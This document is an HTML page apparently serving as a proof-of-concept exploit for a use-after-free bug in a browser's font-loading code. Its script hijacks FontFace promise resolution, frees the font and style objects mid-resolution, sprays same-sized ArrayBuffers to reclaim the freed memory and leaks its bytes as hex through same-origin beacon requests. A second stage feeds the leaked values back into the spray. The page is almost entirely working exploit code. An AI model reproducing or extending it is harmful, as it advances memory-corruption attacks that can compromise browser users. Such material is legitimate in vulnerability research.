<!DOCTYPE html><html><head><meta charset="utf-8"><title>uaf45</title>
<script>
function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m+'?t='+Date.now(),false);x.send(null);}catch(e){}}
function hex8(u,o){var s='';for(var i=0;i<8;i++){s+=('0'+u[o+i].toString(16)).slice(-2)}return s}
/* same trigger as p565, but the scan happens AFTER the getter returns:
   the engine's writes land ~80 ms later, so an in-getter scan always misses. */
var U = Date.now().toString(36);
var K = 16, SIZE = 192, stage = 0, styleEl = null, MAP = [], HIT = null;
function mkFace(tag){
  var fam = 's'+U+'x'+tag, nm = 'f'+U+'x'+tag;
  styleEl = document.createElement('style');
  styleEl.textContent = "@font-face { font-family: "+fam+"; src: local(Arial); unicode-range: U+0042; }";
  document.head.appendChild(styleEl);
  var A = new FontFace(nm, 'local(Helvetica)', { unicodeRange: 'U+0041' });
  document.fonts.add(A);
  void A.loaded;
  (window.__alive = window.__alive || []).push(A);
  return fam;
}
function findHit(){
  for (var i=0;i<MAP.length;i++){
    var u=MAP[i].view;
    if (u[0x58]||u[0x59]||u[0x5A]||u[0x5B]) { HIT=u; return i; }
  }
  return -1;
}
function start(tag){
  stage = tag;
  var fam = mkFace(tag);
  document.fonts.load('1em f'+U+'x'+tag+', '+fam, 'AB').then(function(){
    b('U45-ST'+tag+'-RESOLVED');
    setTimeout(function(){
      var i = findHit();
      if (i<0){ b('U45-ST'+tag+'-NOHIT-'+K); if (tag===1) b('U45-ABORT'); return; }
      b('U45-ST'+tag+'-HIT-b'+i+'-0:'+hex8(MAP[i].view,0)+'-58:'+hex8(MAP[i].view,0x58)+'-68:'+hex8(MAP[i].view,0x68));
      if (tag===1) setTimeout(function(){ start(2); }, 20);
      else b('U45-ST2-SURVIVED');
    }, 80);
  }, function(){ b('U45-ST'+tag+'-REJECTED'); });
}
Object.defineProperty(FontFace.prototype, 'then', {
  configurable: true,
  get: function(){
    if (stage===0) return undefined;
    var st = stage; stage = 0;
    if (styleEl) { styleEl.remove(); styleEl = null; }
    try { document.fonts.delete(this); } catch(e) {}
    document.body.offsetHeight;
    MAP = [];
    for (var k=0;k<K;k++){
      var u = new Uint8Array(new ArrayBuffer(SIZE));
      if (st===2 && HIT){ u[0]=1; u.set(HIT.subarray(0x58,0x60),0x58); u.set(HIT.subarray(0x68,0x70),0x68); }
      MAP.push({ view: u });
    }
    try { document.fonts.check('1em s'+U+'x'+st); } catch(e) {}
    b('U45-ST'+st+'-GETTER-END');
    return undefined;
  },
  set: function(){}
});
function run(){ b('U45-PARSE-'+U); start(1); }
if (document.readyState==='complete'||document.readyState==='interactive') setTimeout(run,0);
else document.addEventListener('DOMContentLoaded',run);
</script></head><body><p>uaf45</p></body></html>
